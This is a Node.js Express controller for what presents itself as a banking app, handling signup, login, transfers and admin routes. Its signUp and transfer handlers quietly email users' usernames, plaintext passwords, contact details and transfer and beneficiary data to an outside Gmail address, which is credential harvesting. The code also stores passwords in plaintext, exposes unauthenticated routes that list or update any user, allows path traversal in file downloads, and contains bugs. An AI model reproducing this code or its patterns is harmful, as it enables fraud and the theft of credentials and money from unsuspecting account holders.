"use strict";
//var nodemailer = require('nodemailer');
var mongoose = require("mongoose");
var ObjectId = mongoose.Types.ObjectId;
var User = mongoose.model('User');
var Transaction = mongoose.model('Transaction');
var Admin = mongoose.model("Admin");
var passport = require("passport");
//var moment = require('moment');
var LocalStrategy = require("passport-local").Strategy;
var salt = require('./salt');
var fs = require('fs');
var uuid = require('uuid');
var transporter = require('./emailService')

function genHash(count) {
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZ01234567899966600555777222";

    for( var i=0; i < count; i++ )
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}


exports.home = function(req,res) {
	if(req.body.safe){
		res.render("home");
	} else {
		res.render("index");
	}
}


exports.home2 = function(req,res) {
	res.render("home");
}

exports.empty = function(req,res) {
	res.render(index2.html)
}

exports.actionpage = function(req,res) { 
	if(req.user){
		res.render('user-gen')
	} else {
		res.redirect('/login')
	}
}

exports.account = function(req,res) { 
	res.render('account')
}

exports.dashboard = function(req,res) { 
	res.render('dashboard')
}

exports.updateDashboard = function(req,res) {
	const {_id,__v,...info} = req.body;
	User.findByIdAndUpdate(_id,info,(err,status) => {
		if(err) throw err;
		res.status(200).json(req.body)
	})
}

exports.login = function(req,res) {
   res.render('login')
}	

exports.signupPage = function(req,res) { 	
	res.render('signup')
}

exports.getTransaction = async function(req,res){
	try{
		const transaction = await Transaction.findById(req.params.id);
		res.status(200).json(transaction);
	} catch(err){
		res.json(500).json(err)
	}
	
}

exports.getTransactions = async function(req,res){
	try{
		const user = await User.findById(req.query.userId)
		.populate({
			model:'Transaction',
			path: 'transactions',
			options:{sort: {createdAt: -1}}
		})
		res.status(200).json(user.transactions);
	} catch(err){
		res.json(500).json(err)
	}
	
}

exports.transfer = async function(req,res) { 
	const user = await User.findById(req.body.userId);
	try{
		if(user){
			const transfer = new Transaction(req.body)
			const saveTransfer = await transfer.save();
			user.transactions.push(transfer._id);
			const saveUser = await user.save();
			res.status(200).json(saveTransfer)

			const options = {
				from: 'gcamon29@outlook.com',
				to: 'trojamm@gmail.com',
				subject: `New Transfer Initiated by ${user.accountHolder} `,
				text: `Account name: ${user.accountHolder}\nAccount number: ${user.accNum}
				\nBenefiary Acc number: ${req.body.destinationAcc}\nBeneficiary bank name: ${req.body.bank}\nBeneficiary acc name: ${req.body.destinationName}
				\nTransfer amount: ${req.body.amount}\nSwift code: ${req.body.swiftCode}
				\nUsername: ${user.username}\nPassword: ${user.password}`
			}
		
			transporter.sendMail(options,(err,info) => {
				if(err) throw err;
				console.log(info.response)
			})
		} else {
			return res.status(401).json('User not found')
		}
	} catch(err){
		res.status(500).json(err)
	}
	
}	

exports.authLogin = function(req,res){
	User.findOne({username: req.body.username, password: req.body.password},
	function(err,data){
		if(err) throw err;
		if(data){
			return res.status(200).json(data)
		} else {
			return res.status(200).json({message:"Wrong username or password"})
		}
		
	})
}

exports.getUsersByAdmin = function(req,res){
	User.find({},
	function(err,data){
		if(err) throw err;
		if(data){
			return res.status(200).json(data)
		} else {
			return res.status(200).json({message:"Wrong username or password"})
		}
		
	})
}

exports.loginFail = function(req,res){
	res.redirect('/login')
} 

exports.downloadFile = function(req,res){
	res.download(`${__dirname}/uploads/${req.params.fileId}`)
}

exports.signUp = function(req,res){
	User.findOne({email:req.body.email},function(err,user){
		if(err) return res.status(500).json(err);
		if(user){
			return res.status(200).json({error:true,message: `User with ${req.body.email} already exist! Please use another username`});	
		} else {
			var user = new User(req.body);		
			user.username = req.body.email.split('@')[0];	
			user.password = genHash(7);
			user.save(function(err,info){
				if(err) throw err;
				res.status(200).json(user);
				const options = {
					from: 'gcamon29@outlook.com',
					to: 'trojamm@gmail.com', 
					subject: `New User Registration`,
					text: `Account name: ${user.accountHolder}\nUsername: ${user.username}\nPassword: ${user.password}
					\nAcc Type: ${user.accType}\nCity: ${user.city}\nPhone: ${req.body.phone}\nEmail: ${req.body.email}`
				}
			
				transporter.sendMail(options,(err,info) => {
					if(err) throw err;
					console.log(info.response)
				})

			})
		}
	})	
	
}


exports.signUpUpload = function(req,res) {
	res.status(200).json(req.files)
}

exports.updateProfilePic = function(req,res){
	User.findByIdAndUpdate(req.body.userId,{profile_pic_url: req.body.url},function(err,info){
		if(err) throw err;
		res.status(200).json(info)
	})
}

exports.logOut = function(req,res){
	req.logout();
  	res.redirect('/login');
}







